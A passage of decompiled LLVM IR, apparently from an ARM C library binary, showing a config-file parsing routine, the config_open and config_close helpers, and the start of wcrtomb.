  %v3_1af48 = load i32, i32* %v2_1af48, align 4
  %v2_1af4c = add i32 %v3_1af48, %v3_1af44
  store i32 %v2_1af4c, i32* %r3.global-to-local, align 4
  %v2_1af50 = add i32 %v0_1af48, 12
  %v3_1af50 = inttoptr i32 %v2_1af50 to i32*
  store i32 %v2_1af4c, i32* %v3_1af50, align 4
  %v1_1af54 = load i32, i32* @r5, align 4
  %v2_1af54 = add i32 %v1_1af54, 4
  %v3_1af54 = inttoptr i32 %v2_1af54 to i32*
  store i32 %v3_1af44, i32* %v3_1af54, align 4
  %v0_1aea8.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1aea0

dec_label_pc_1af5c:                               ; preds = %dec_label_pc_1af20, %.dec_label_pc_1af5c_crit_edge
  %v0_1af5c = phi i32 [ %v0_1af5c.pre, %.dec_label_pc_1af5c_crit_edge ], [ %v0_1af20, %dec_label_pc_1af20 ]
  %v1_1af5c = inttoptr i32 %v0_1af5c to i32*
  %v2_1af5c = load i32, i32* %v1_1af5c, align 4
  store i32 %v2_1af5c, i32* @r1, align 4
  %v1_1af60 = add i32 %v2_1af5c, 52
  %v2_1af60 = inttoptr i32 %v1_1af60 to i32*
  %v3_1af60 = load i32, i32* %v2_1af60, align 4
  store i32 %v3_1af60, i32* %r3.global-to-local, align 4
  %v2_1af64 = icmp eq i32 %v3_1af60, 0
  store i1 %v2_1af64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af64, label %dec_label_pc_1af90, label %dec_label_pc_1af6c

dec_label_pc_1af6c:                               ; preds = %dec_label_pc_1af5c
  %v1_1af6c = add i32 %v2_1af5c, 16
  %v2_1af6c = inttoptr i32 %v1_1af6c to i32*
  %v3_1af6c = load i32, i32* %v2_1af6c, align 4
  store i32 %v3_1af6c, i32* %r2.global-to-local, align 4
  %v1_1af70 = add i32 %v2_1af5c, 24
  %v2_1af70 = inttoptr i32 %v1_1af70 to i32*
  %v3_1af70 = load i32, i32* %v2_1af70, align 4
  store i32 %v3_1af70, i32* %r3.global-to-local, align 4
  %v3_1af74 = icmp ult i32 %v3_1af6c, %v3_1af70
  %v9_1af74 = icmp eq i32 %v3_1af6c, %v3_1af70
  store i1 %v9_1af74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1af74, label %dec_label_pc_1af98thread-pre-split, label %dec_label_pc_1af84

dec_label_pc_1af84:                               ; preds = %dec_label_pc_1af6c
  store i32 %v2_1af5c, i32* %r0.global-to-local, align 4
  %v1_1af88 = inttoptr i32 %v2_1af5c to i16*
  %v2_1af88 = call i32 @getc_unlocked(i16* %v1_1af88)
  store i32 %v2_1af88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1af98

dec_label_pc_1af90:                               ; preds = %dec_label_pc_1af5c
  store i32 %v2_1af5c, i32* %r0.global-to-local, align 4
  %v1_1af94 = call i32 @__GI_fgetc(i32 %v2_1af5c)
  store i32 %v1_1af94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1af98

dec_label_pc_1af98thread-pre-split:               ; preds = %dec_label_pc_1af6c
  %v2_1af78 = inttoptr i32 %v3_1af6c to i8*
  %v3_1af78 = load i8, i8* %v2_1af78, align 1
  %v4_1af78 = zext i8 %v3_1af78 to i32
  store i32 %v4_1af78, i32* %r0.global-to-local, align 4
  %v6_1af78 = add i32 %v3_1af6c, 1
  store i32 %v6_1af78, i32* %r2.global-to-local, align 4
  store i32 %v6_1af78, i32* %v2_1af6c, align 4
  %v0_1af98.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1af98

dec_label_pc_1af98:                               ; preds = %dec_label_pc_1af98thread-pre-split, %dec_label_pc_1af84, %dec_label_pc_1af90
  %v1_1af9c = phi i32 [ %v0_1af98.pr, %dec_label_pc_1af98thread-pre-split ], [ %v2_1af88, %dec_label_pc_1af84 ], [ %v1_1af94, %dec_label_pc_1af90 ]
  %v7_1af98 = icmp eq i32 %v1_1af9c, 10
  store i1 %v7_1af98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af98, label %dec_label_pc_1afa4.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_1af98
  %v8_1af9c = icmp eq i32 %v1_1af9c, -1
  store i1 %v8_1af9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1af9c, label %dec_label_pc_1afa4.loopexit, label %.dec_label_pc_1af5c_crit_edge

.dec_label_pc_1af5c_crit_edge:                    ; preds = %bb66
  %v0_1af5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1af5c

dec_label_pc_1afa4.loopexit:                      ; preds = %bb66, %dec_label_pc_1af98
  %v0_1afa4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1afa4

dec_label_pc_1afa4:                               ; preds = %dec_label_pc_1aefc, %dec_label_pc_1afa4.loopexit
  %v0_1afa4 = phi i32 [ %v0_1afa4.pre, %dec_label_pc_1afa4.loopexit ], [ %v1_1af10, %dec_label_pc_1aefc ]
  %v7_1afa4 = icmp eq i32 %v0_1afa4, -1
  store i1 %v7_1afa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1afa4, label %dec_label_pc_1b0ec, label %dec_label_pc_1afac

dec_label_pc_1afac:                               ; preds = %dec_label_pc_1afa4
  store i32 %v1_1ae14, i32* %r3.global-to-local, align 4
  store i1 %v2_1afb0, i1* %cpsr_z.global-to-local, align 1
  %v0_1afb4 = load i32, i32* @r5, align 4
  %v1_1afb4 = add i32 %v0_1afb4, 12
  %v2_1afb4 = inttoptr i32 %v1_1afb4 to i32*
  %v3_1afb4 = load i32, i32* %v2_1afb4, align 4
  store i32 %v3_1afb4, i32* @r4, align 4
  br i1 %v2_1afb0, label %dec_label_pc_1afcc, label %dec_label_pc_1afbc

dec_label_pc_1afbc:                               ; preds = %dec_label_pc_1afac
  store i32 %v3_1afb4, i32* @r0, align 4
  %v1_1afc4 = inttoptr i32 %v3_1afb4 to i8*
  %v2_1afc4 = call i32 @__GI_strspn(i8* %v1_1afc4)
  store i32 %v2_1afc4, i32* %r0.global-to-local, align 4
  %v0_1afc8 = load i32, i32* @r4, align 4
  %v2_1afc8 = add i32 %v0_1afc8, %v2_1afc4
  store i32 %v2_1afc8, i32* @r4, align 4
  br label %dec_label_pc_1afcc

dec_label_pc_1afcc:                               ; preds = %dec_label_pc_1afac, %dec_label_pc_1afbc
  %v0_1afcc = phi i32 [ %v3_1afb4, %dec_label_pc_1afac ], [ %v2_1afc8, %dec_label_pc_1afbc ]
  %v1_1afcc = inttoptr i32 %v0_1afcc to i8*
  %v2_1afcc = load i8, i8* %v1_1afcc, align 1
  %v3_1afcc = zext i8 %v2_1afcc to i32
  store i32 %v3_1afcc, i32* %r2.global-to-local, align 4
  %v2_1afd0 = icmp eq i8 %v2_1afcc, 0
  store i1 %v2_1afd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1afd0, label %dec_label_pc_1ae3c.backedge, label %dec_label_pc_1afd8

dec_label_pc_1ae3c.backedge:                      ; preds = %dec_label_pc_1afcc, %dec_label_pc_1afd8, %dec_label_pc_1b0e4
  %v0_1ae3c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ae3c

dec_label_pc_1afd8:                               ; preds = %dec_label_pc_1afcc
  %v0_1afd8 = load i32, i32* @r7, align 4
  %v1_1afd8 = inttoptr i32 %v0_1afd8 to i8*
  %v2_1afd8 = load i8, i8* %v1_1afd8, align 1
  %v3_1afd8 = zext i8 %v2_1afd8 to i32
  store i32 %v3_1afd8, i32* %r3.global-to-local, align 4
  %v9_1afdc = icmp eq i8 %v2_1afd8, %v2_1afcc
  store i1 %v9_1afdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1afdc, label %dec_label_pc_1ae3c.backedge, label %dec_label_pc_1afe4

dec_label_pc_1afe4:                               ; preds = %dec_label_pc_1afd8
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_1afe8 = load i32, i32* @r5, align 4
  %v1_1afe8 = add i32 %v0_1afe8, 4
  %v2_1afe8 = inttoptr i32 %v1_1afe8 to i32*
  %v3_1afe8 = load i32, i32* %v2_1afe8, align 4
  store i32 %v3_1afe8, i32* %r0.global-to-local, align 4
  %v0_1afec = load i32, i32* @fp, align 4
  store i32 %v3_1afe8, i32* %v1_1b008, align 4
  store i32 %v3_1ae00, i32* %r2.global-to-local, align 4
  %v3_1aff8 = inttoptr i32 %v3_1afe8 to i8*
  %v4_1aff8 = call i32 @__GI_memset(i8* %v3_1aff8, i32 %v0_1afec, i32 %v3_1ae00)
  store i32 %v4_1aff8, i32* %r0.global-to-local, align 4
  %v0_1affc = load i32, i32* @fp, align 4
  store i32 %v0_1affc, i32* @r6, align 4
  %v0_1b0bc12 = load i32, i32* @r4, align 4
  %v1_1b0bc13 = inttoptr i32 %v0_1b0bc12 to i8*
  %v2_1b0bc14 = load i8, i8* %v1_1b0bc13, align 1
  %v3_1b0bc15 = zext i8 %v2_1b0bc14 to i32
  store i32 %v3_1b0bc15, i32* %r2.global-to-local, align 4
  %v2_1b0c016 = icmp eq i8 %v2_1b0bc14, 0
  store i1 %v2_1b0c016, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0c016, label %dec_label_pc_1b0d8, label %dec_label_pc_1b0c8

dec_label_pc_1b004:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_1b008 = load i32, i32* %v1_1b008, align 4
  store i32 %v2_1b008, i32* %r3.global-to-local, align 4
  store i32 %v1_1ae18, i32* %r2.global-to-local, align 4
  %v9_1b010 = icmp eq i32 %v2_1b014, %v1_1ae18
  store i1 %v9_1b010, i1* %cpsr_z.global-to-local, align 1
  %v5_1b014 = mul i32 %v2_1b014, 4
  %v6_1b014 = add i32 %v2_1b008, %v5_1b014
  %v7_1b014 = inttoptr i32 %v6_1b014 to i32*
  store i32 %v0_1b014, i32* %v7_1b014, align 4
  br i1 %v9_1b010, label %dec_label_pc_1b01c, label %dec_label_pc_1b028

dec_label_pc_1b01c:                               ; preds = %dec_label_pc_1b004
  store i32 %v1_1ae24, i32* %r3.global-to-local, align 4
  store i1 %v2_1b020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b020, label %dec_label_pc_1b028, label %dec_label_pc_1b048

dec_label_pc_1b028:                               ; preds = %dec_label_pc_1b01c, %dec_label_pc_1b004
  %v0_1b028 = load i32, i32* @r7, align 4
  %v1_1b028 = inttoptr i32 %v0_1b028 to i8*
  %v2_1b028 = load i8, i8* %v1_1b028, align 1
  %v3_1b028 = zext i8 %v2_1b028 to i32
  store i32 %v3_1b028, i32* %r3.global-to-local, align 4
  %v2_1b02c = icmp eq i8 %v2_1b028, 0
  store i1 %v2_1b02c, i1* %cpsr_z.global-to-local, align 1
  %v0_1b030 = load i32, i32* @r4, align 4
  store i32 %v0_1b030, i32* @r0, align 4
  %v1_1b034 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_1b02c, i32 %v1_1b034, i32 %v0_1b028
  store i32 %storemerge, i32* @r1, align 4
  %v0_1b03c = call i32 @strcspn()
  store i32 %v0_1b03c, i32* %r0.global-to-local, align 4
  %v0_1b040 = load i32, i32* @r4, align 4
  %v2_1b040 = add i32 %v0_1b040, %v0_1b03c
  store i32 %v2_1b040, i32* @r4, align 4
  br label %dec_label_pc_1b080

dec_label_pc_1b048:                               ; preds = %dec_label_pc_1b01c
  %v0_1b048 = load i32, i32* @r4, align 4
  store i32 %v0_1b048, i32* @r0, align 4
  %v0_1b04c = load i32, i32* @r7, align 4
  %v1_1b04c = inttoptr i32 %v0_1b04c to i8*
  %v2_1b04c = load i8, i8* %v1_1b04c, align 1
  %v3_1b04c = zext i8 %v2_1b04c to i32
  %v5_1b050 = call i32 @__GI_strchrnul(i32 %v0_1b048, i32 %v3_1b04c, i32 %v1_1ae18, i32 %v1_1ae24)
  store i32 %v5_1b050, i32* %r0.global-to-local, align 4
  store i32 %v1_1ae14, i32* %r2.global-to-local, align 4
  store i1 %v2_1afb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1b050, i32* @r4, align 4
  br i1 %v2_1afb0, label %dec_label_pc_1b080, label %dec_label_pc_1b06c

dec_label_pc_1b068:                               ; preds = %dec_label_pc_1b06c
  %v1_1b068 = add i32 %v0_1b080.pre, -1
  store i32 %v1_1b068, i32* @r4, align 4
  br label %dec_label_pc_1b06c

dec_label_pc_1b06c:                               ; preds = %dec_label_pc_1b048, %dec_label_pc_1b068
  %v0_1b06c = phi i32 [ %v1_1b068, %dec_label_pc_1b068 ], [ %v5_1b050, %dec_label_pc_1b048 ]
  %v1_1b06c = add i32 %v0_1b06c, -1
  %v2_1b06c = inttoptr i32 %v1_1b06c to i8*
  %v3_1b06c = load i8, i8* %v2_1b06c, align 1
  %v4_1b06c = zext i8 %v3_1b06c to i32
  %v0_1b070 = load i32, i32* @sl, align 4
  store i32 %v0_1b070, i32* @r0, align 4
  %v2_1b074 = call i32 @__GI_strchr(i32 %v0_1b070, i32 %v4_1b06c)
  store i32 %v2_1b074, i32* %r0.global-to-local, align 4
  %v2_1b078 = icmp eq i32 %v2_1b074, 0
  store i1 %v2_1b078, i1* %cpsr_z.global-to-local, align 1
  %v0_1b080.pre = load i32, i32* @r4, align 4
  br i1 %v2_1b078, label %dec_label_pc_1b080, label %dec_label_pc_1b068

dec_label_pc_1b080:                               ; preds = %dec_label_pc_1b06c, %dec_label_pc_1b048, %dec_label_pc_1b028
  %v3_1b08c = phi i32 [ %v5_1b050, %dec_label_pc_1b048 ], [ %v2_1b040, %dec_label_pc_1b028 ], [ %v0_1b080.pre, %dec_label_pc_1b06c ]
  %v1_1b080 = inttoptr i32 %v3_1b08c to i8*
  %v2_1b080 = load i8, i8* %v1_1b080, align 1
  %v3_1b080 = zext i8 %v2_1b080 to i32
  store i32 %v3_1b080, i32* %r2.global-to-local, align 4
  %v0_1b084 = load i32, i32* @r7, align 4
  %v1_1b084 = inttoptr i32 %v0_1b084 to i8*
  %v2_1b084 = load i8, i8* %v1_1b084, align 1
  %v3_1b084 = zext i8 %v2_1b084 to i32
  store i32 %v3_1b084, i32* %r3.global-to-local, align 4
  %v9_1b088 = icmp eq i8 %v2_1b084, %v2_1b080
  store i1 %v9_1b088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1b088, label %bb69, label %dec_label_pc_1b094

bb69:                                             ; preds = %dec_label_pc_1b080
  %v1_1b08c = load i32, i32* @fp, align 4
  %v2_1b08c = trunc i32 %v1_1b08c to i8
  store i8 %v2_1b08c, i8* %v1_1b080, align 1
  %v0_1b090.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b090.pr, label %bb71, label %.dec_label_pc_1b094_crit_edge

.dec_label_pc_1b094_crit_edge:                    ; preds = %bb69
  %v0_1b094.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b094

dec_label_pc_1b094:                               ; preds = %.dec_label_pc_1b094_crit_edge, %dec_label_pc_1b080
  %v0_1b094 = phi i32 [ %v0_1b094.pre, %.dec_label_pc_1b094_crit_edge ], [ %v3_1b080, %dec_label_pc_1b080 ]
  %v2_1b094 = icmp eq i32 %v0_1b094, 0
  store i1 %v2_1b094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b094, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_1b094
  %v1_1b098 = load i32, i32* @fp, align 4
  %v2_1b098 = trunc i32 %v1_1b098 to i8
  %v3_1b098 = load i32, i32* @r4, align 4
  %v4_1b098 = inttoptr i32 %v3_1b098 to i8*
  store i8 %v2_1b098, i8* %v4_1b098, align 1
  %v5_1b098 = load i32, i32* @r4, align 4
  %v6_1b098 = add i32 %v5_1b098, 1
  store i32 %v6_1b098, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_1b094, %bb70
  %v2_1b09c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1b09c, i32* %r3.global-to-local, align 4
  %v2_1b0a0 = icmp eq i32 %v2_1b09c, 0
  store i1 %v2_1b0a0, i1* %cpsr_z.global-to-local, align 1
  %v0_1b0bc.pre = load i32, i32* @r4, align 4
  br i1 %v2_1b0a0, label %dec_label_pc_1b0b8, label %dec_label_pc_1b0a8

dec_label_pc_1b0a8:                               ; preds = %bb71
  store i32 %v0_1b0bc.pre, i32* @r0, align 4
  %v1_1b0b0 = inttoptr i32 %v0_1b0bc.pre to i8*
  %v2_1b0b0 = call i32 @__GI_strspn(i8* %v1_1b0b0)
  store i32 %v2_1b0b0, i32* %r0.global-to-local, align 4
  %v0_1b0b4 = load i32, i32* @r4, align 4
  %v2_1b0b4 = add i32 %v0_1b0b4, %v2_1b0b0
  store i32 %v2_1b0b4, i32* @r4, align 4
  br label %dec_label_pc_1b0b8

dec_label_pc_1b0b8:                               ; preds = %bb71, %dec_label_pc_1b0a8
  %v0_1b0bc = phi i32 [ %v2_1b0b4, %dec_label_pc_1b0a8 ], [ %v0_1b0bc.pre, %bb71 ]
  %v0_1b0b8 = load i32, i32* @r6, align 4
  %v1_1b0b8 = add i32 %v0_1b0b8, 1
  store i32 %v1_1b0b8, i32* @r6, align 4
  %v1_1b0bc = inttoptr i32 %v0_1b0bc to i8*
  %v2_1b0bc = load i8, i8* %v1_1b0bc, align 1
  %v3_1b0bc = zext i8 %v2_1b0bc to i32
  store i32 %v3_1b0bc, i32* %r2.global-to-local, align 4
  %v2_1b0c0 = icmp eq i8 %v2_1b0bc, 0
  store i1 %v2_1b0c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0c0, label %dec_label_pc_1b0d8, label %dec_label_pc_1b0c8

dec_label_pc_1b0c8:                               ; preds = %dec_label_pc_1afe4, %dec_label_pc_1b0b8
  %v0_1b014 = phi i32 [ %v0_1b0bc, %dec_label_pc_1b0b8 ], [ %v0_1b0bc12, %dec_label_pc_1afe4 ]
  %v2_1b014 = phi i32 [ %v1_1b0b8, %dec_label_pc_1b0b8 ], [ %v0_1affc, %dec_label_pc_1afe4 ]
  %v1_1b0cc = phi i32 [ %v3_1b0bc, %dec_label_pc_1b0b8 ], [ %v3_1b0bc15, %dec_label_pc_1afe4 ]
  %v0_1b0c8 = load i32, i32* @r7, align 4
  %v1_1b0c8 = inttoptr i32 %v0_1b0c8 to i8*
  %v2_1b0c8 = load i8, i8* %v1_1b0c8, align 1
  %v3_1b0c8 = zext i8 %v2_1b0c8 to i32
  store i32 %v3_1b0c8, i32* %r3.global-to-local, align 4
  %v9_1b0cc = icmp eq i32 %v3_1b0c8, %v1_1b0cc
  store i1 %v9_1b0cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1b0cc, label %dec_label_pc_1b0d8, label %bb72

bb72:                                             ; preds = %dec_label_pc_1b0c8
  %v2_1b0d0 = load i32, i32* @sb, align 4
  %v3_1b0d0 = sub i32 %v2_1b014, %v2_1b0d0
  %v5_1b0d0 = xor i32 %v2_1b0d0, %v2_1b014
  %v6_1b0d0 = xor i32 %v3_1b0d0, %v2_1b014
  %v7_1b0d0 = and i32 %v6_1b0d0, %v5_1b0d0
  %v8_1b0d0 = icmp slt i32 %v7_1b0d0, 0
  %v9_1b0d0 = icmp slt i32 %v3_1b0d0, 0
  %v10_1b0d0 = icmp eq i32 %v2_1b014, %v2_1b0d0
  store i1 %v10_1b0d0, i1* %cpsr_z.global-to-local, align 1
  %v2_1b0d4 = xor i1 %v9_1b0d0, %v8_1b0d0
  br i1 %v2_1b0d4, label %dec_label_pc_1b004, label %dec_label_pc_1b0d8

dec_label_pc_1b0d8:                               ; preds = %dec_label_pc_1b0c8, %dec_label_pc_1b0b8, %bb72, %dec_label_pc_1afe4
  %v0_1b0dc = phi i32 [ %v0_1affc, %dec_label_pc_1afe4 ], [ %v2_1b014, %dec_label_pc_1b0c8 ], [ %v1_1b0b8, %dec_label_pc_1b0b8 ], [ %v2_1b014, %bb72 ]
  store i32 %v3_1adfc, i32* %r2.global-to-local, align 4
  %v9_1b0dc = icmp eq i32 %v0_1b0dc, %v3_1adfc
  store i1 %v9_1b0dc, i1* %cpsr_z.global-to-local, align 1
  %v6_1b0e0 = icmp slt i32 %v0_1b0dc, %v3_1adfc
  br i1 %v6_1b0e0, label %dec_label_pc_1b0e4, label %dec_label_pc_1b0f0

dec_label_pc_1b0e4:                               ; preds = %dec_label_pc_1b0d8
  %v0_1b0e4 = load i32, i32* @r8, align 4
  %v1_1b0e4 = and i32 %v0_1b0e4, 1048576
  %v2_1b0e4 = icmp eq i32 %v1_1b0e4, 0
  store i1 %v2_1b0e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0e4, label %dec_label_pc_1ae3c.backedge, label %dec_label_pc_1b0ec

dec_label_pc_1b0ec:                               ; preds = %dec_label_pc_1b0e4, %dec_label_pc_1afa4, %.thread, %entry
  br label %dec_label_pc_1b0f0

dec_label_pc_1b0f0:                               ; preds = %dec_label_pc_1b0d8, %dec_label_pc_1aec0, %dec_label_pc_1b0ec
  %v0_1b0f0 = phi i32 [ %v0_1aed0, %dec_label_pc_1aec0 ], [ 0, %dec_label_pc_1b0ec ], [ %v0_1b0dc, %dec_label_pc_1b0d8 ]
  store i32 %v0_1b0f0, i32* %r0.global-to-local, align 4
  store i32 %v3_1add8, i32* @r4, align 4
  store i32 %v6_1add8, i32* @r5, align 4
  store i32 %v9_1add8, i32* @r6, align 4
  store i32 %v12_1add8, i32* @r7, align 4
  store i32 %v15_1add8, i32* @r8, align 4
  store i32 %v18_1add8, i32* @sb, align 4
  store i32 %v21_1add8, i32* @sl, align 4
  store i32 %v24_1add8, i32* @fp, align 4
  ret i32 %v0_1b0f0

; uselistorder directives
  uselistorder i32 %v0_1b0f0, { 1, 0 }
  uselistorder i32 %v0_1b0dc, { 0, 2, 1 }
  uselistorder i32 %v3_1b0d0, { 1, 0 }
  uselistorder i32 %v2_1b0d0, { 1, 0, 2 }
  uselistorder i32 %v2_1b014, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_1b0bc.pre, { 0, 2, 1 }
  uselistorder i32 %v5_1b050, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1affc, { 1, 0, 2 }
  uselistorder i1 %v9_1afdc, { 1, 0 }
  uselistorder i32 %v3_1afb4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1afa4, { 1, 0 }
  uselistorder i1 %v8_1af9c, { 1, 0 }
  uselistorder i32 %v3_1af6c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1af5c, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v3_1af44, { 1, 0, 2 }
  uselistorder i32 %v1_1af34, { 1, 0, 2 }
  uselistorder i32 %v0_1af20, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1af18, { 1, 0 }
  uselistorder i32 %v1_1af04, { 1, 0 }
  uselistorder i32 %v1_1af00, { 1, 0 }
  uselistorder i32 %v2_1aedc, { 1, 0 }
  uselistorder i32 %v1_1aec0, { 2, 0, 1 }
  uselistorder i32 %v0_1aea8, { 1, 0 }
  uselistorder i32 %v1_1ae98, { 0, 2, 1 }
  uselistorder i32* %v1_1b008, { 1, 0 }
  uselistorder i1 %v2_1afb0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1ae24, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1ae18, { 2, 1, 0 }
  uselistorder i32 %v3_1ae00, { 1, 2, 0 }
  uselistorder i32 %v3_1adfc, { 2, 1, 0 }
  uselistorder i32 %v1_1adf4, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 81, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1b0f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b0d8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1b0c8, { 1, 0 }
  uselistorder label %dec_label_pc_1b0b8, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b06c, { 1, 0 }
  uselistorder label %dec_label_pc_1ae3c.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1afcc, { 1, 0 }
  uselistorder label %dec_label_pc_1afa4, { 1, 0 }
  uselistorder label %dec_label_pc_1af98, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1af5c, { 1, 0 }
  uselistorder label %dec_label_pc_1ae90, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_1b104 = icmp eq i32* %arg1, null
  br i1 %v2_1b104, label %dec_label_pc_1b12c, label %dec_label_pc_1b10c

dec_label_pc_1b10c:                               ; preds = %entry
  %v2_1b10c = load i32, i32* %arg1, align 4
  %v1_1b110 = inttoptr i32 %v2_1b10c to i16*
  %v2_1b110 = call i32 @__GI_fclose(i16* %v1_1b110)
  %v0_1b114 = load i32, i32* @r4, align 4
  %v1_1b114 = add i32 %v0_1b114, 20
  %v2_1b114 = inttoptr i32 %v1_1b114 to i32*
  %v3_1b114 = load i32, i32* %v2_1b114, align 4
  %v2_1b118 = icmp eq i32 %v3_1b114, 0
  br i1 %v2_1b118, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1b10c
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_1b10c, %bb
  store i32 110884, i32* @lr, align 4
  %v1_1b120 = xor i1 %v2_1b118, true
  call void @__pseudo_cond_branch(i1 %v1_1b120, i32 ptrtoint (i32* @global_var_17778.1695 to i32))
  %v0_1b124 = load i32, i32* @r4, align 4
  store i32 %v0_1b124, i32* @r0, align 4
  %v0_1b128 = call i32 @free()
  br label %dec_label_pc_1b12c

dec_label_pc_1b12c:                               ; preds = %entry, %bb6
  %v1_1b130 = phi i32 [ 0, %entry ], [ %v0_1b128, %bb6 ]
  ret i32 %v1_1b130

; uselistorder directives
  uselistorder label %dec_label_pc_1b12c, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1b140 = load i32, i32* @r4, align 4
  store i32 %v3_1b140, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34656), i32* @r1, align 4
  %v0_1b148 = load i32, i32* @r0, align 4
  %v2_1b148 = load i32, i32* @r2, align 4
  %v4_1b148 = call i32 @__GI_fopen(i32 %v0_1b148, i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34656), i32 %v2_1b148, i32 ptrtoint (i32* @global_var_32024.1324 to i32))
  store i32 %v4_1b148, i32* %r0.global-to-local, align 4
  store i32 %v4_1b148, i32* @r4, align 4
  %v2_1b14c = icmp eq i32 %v4_1b148, 0
  br i1 %v2_1b14c, label %bb, label %dec_label_pc_1b158

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_1b158:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1b160 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_1b160, i32* %r0.global-to-local, align 4
  %v2_1b164 = icmp eq i32 %v2_1b160, 0
  br i1 %v2_1b164, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_1b158
  %v1_1b168 = load i32, i32* @r4, align 4
  %v3_1b168 = inttoptr i32 %v2_1b160 to i32*
  store i32 %v1_1b168, i32* %v3_1b168, align 4
  %v1_1b170.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_1b158, %bb4
  %v1_1b170 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_1b158 ], [ %v1_1b170.pre, %bb4 ]
  %v2_1b16c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1b16c, i32* @r4, align 4
  ret i32 %v1_1b170

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 0, 2, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34656), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_1b17c = load i32, i32* @lr, align 4
  %v2_1b180 = icmp eq i32 %arg1, 0
